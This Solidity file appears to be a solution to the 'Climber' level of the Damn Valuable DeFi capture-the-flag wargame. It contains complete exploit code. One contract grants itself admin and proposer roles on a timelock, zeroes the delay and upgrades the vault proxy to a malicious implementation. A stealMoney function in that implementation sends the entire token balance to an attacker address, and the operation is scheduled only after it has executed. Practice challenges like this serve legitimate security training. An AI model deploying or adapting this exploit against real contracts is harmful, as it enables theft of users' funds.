pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";
import "../DamnValuableToken.sol";

import "hardhat/console.sol";


contract AaronVault is ClimberVault {
    function stealMoney(address attacker, address _token) public {
        DamnValuableToken token = DamnValuableToken(_token);
        console.log("stealing %d tokens...", token.balanceOf(address(this)));
        token.transfer(attacker, token.balanceOf(address(this)));
        console.log("sent tokens to %s (balance is now %d)", attacker, token.balanceOf(address(this)));
    }
}


contract AaronExploit {
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    ClimberTimelock timelock;
    ClimberVault vault;
    AaronVault aaronvault;
    DamnValuableToken token;

    address[] tos = new address[](5);
    uint256[] values = new uint256[](5);
    bytes[] datas = new bytes[](5);
    bytes32 salt = 0x7465737400000000000000000000000000000000000000000000000000000000;

    constructor(address payable _timelock, address payable _vault, address payable _aaronvault, address _token, address attacker) {
        timelock = ClimberTimelock(_timelock);
        vault = ClimberVault(_vault);
        aaronvault = AaronVault(_aaronvault);
        token = DamnValuableToken(_token);

        tos[0] = address(timelock);
        tos[1] = address(timelock);
        tos[2] = address(timelock);
        tos[3] = address(vault);
        tos[4] = address(this);

        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        values[4] = 0;

        datas[0] = abi.encodeWithSignature('grantRole(bytes32,address)', ADMIN_ROLE, address(this));
        datas[1] = abi.encodeWithSignature('grantRole(bytes32,address)', PROPOSER_ROLE, address(this));
        datas[2] = abi.encodeWithSignature('updateDelay(uint64)', 0);
        datas[3] = abi.encodeWithSignature('upgradeToAndCall(address,bytes)', address(aaronvault),
            abi.encodeWithSignature('stealMoney(address,address)', attacker, address(token)));
        datas[4] = abi.encodeWithSignature('aaronSchedule()');
    }


    receive() payable external {}
    fallback() external payable {}

    function pwn() public {
        console.log("pwn():");
        timelock.execute(tos, values, datas, salt);
    }

    function aaronSchedule() public {
        console.log("aaronSchedule():");
        timelock.schedule(tos, values, datas, salt);
    }
}
